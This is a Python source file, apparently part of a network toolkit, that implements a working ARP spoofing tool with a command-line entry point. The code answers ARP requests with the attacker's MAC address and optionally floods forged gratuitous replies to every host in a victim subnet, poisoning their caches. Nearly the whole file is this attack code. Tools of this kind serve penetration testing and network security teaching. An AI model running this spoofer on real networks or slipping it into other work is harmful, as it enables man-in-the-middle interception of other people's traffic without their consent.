"""ARP Spoofing.

Usage:

	python3 -m agave.arp.spoof <target: subnet|ip> [<victim: subnet|ip>] [-f]

"""
import socket, sys
from agave.core.helpers import Service, SocketAddress
from agave.core.arp import ARP, OPERATION_REQUEST
from agave.core.ethernet import Ethernet, ETHER_TYPE_ARP, MACAddress
from agave.nic.interfaces import NetworkInterface
from .utils import create_filter, _parse, _create_socket
from .resolve import resolve_mac
from ipaddress import IPv4Address, IPv4Network
from typing import Callable, Tuple


class Spoofer(Service):

	__slots__ = ("filter", "messages_to_flood")

	def __init__(
		self,
		sock: "socket.socket",
		request_filter: Callable[[ARP], bool],
		messages_to_flood: Tuple[bytes, SocketAddress],
		**kwargs
	):
		super().__init__(sock, **kwargs)
		if messages_to_flood is None or messages_to_flood == []:
			self.disable_loop()
		self.filter = request_filter
		self.messages_to_flood = messages_to_flood

	def loop(self) -> bool:
		for packet, address in self.messages_to_flood:
			self.sock.sendto(packet, address)
		return True

	def process(self, data: bytes, address: SocketAddress) -> None:
		_, arp = _parse(data)
		if self.filter(arp):
			self.sock.sendto(
				arp.reply(self.mac.address),
				(address[0], address[1])
			)


if __name__ == "__main__":

	try:
		# Parses arguments
		a = IPv4Network(sys.argv[1])
		b = None
		gratuitous = False
		interface = NetworkInterface.get_by_host(a.network_address)
		if len(sys.argv) > 2:
			b = IPv4Network(sys.argv[2])
		if len(sys.argv) > 3 and sys.argv[3] == "-f":
			if b.num_addresses > 0xff:
				print("[WARNING] Subnet is too large to send gratuitous replies.")
			else:
				print("[INFO] Flood gratuitous is enabled.")
				gratuitous = True
		# Builds gratuitous replies
		sock = _create_socket()
		messages = []
		if gratuitous is True:
			addr = (interface.name, ETHER_TYPE_ARP)
			for sender in a.hosts():
				for target in b.hosts():
					t_mac = resolve_mac(target, interface, sock=sock)
					if t_mac is None:
						print(
							"[WARNING] Couldn't resolve MAC for {}. This host "
							"won't be flooded with gratuitous replies.".format(target)
						)
					else:
						messages.append((ARP.is_at(interface.mac.address, sender, t_mac.address, target), addr))
		# Builds service		
		service = Spoofer(
			sock,
			create_filter(OPERATION_REQUEST, sender=b, target=a),
			messages,
			interval=(1 if gratuitous else 3600),
			wait=0
		)
		# Running
		print("[INFO] Running...")
		service.run()

	except KeyboardInterrupt:
		pass
	except BaseException as e:
		raise e
		print(__doc__)
		print(f"[ERROR] {e}")

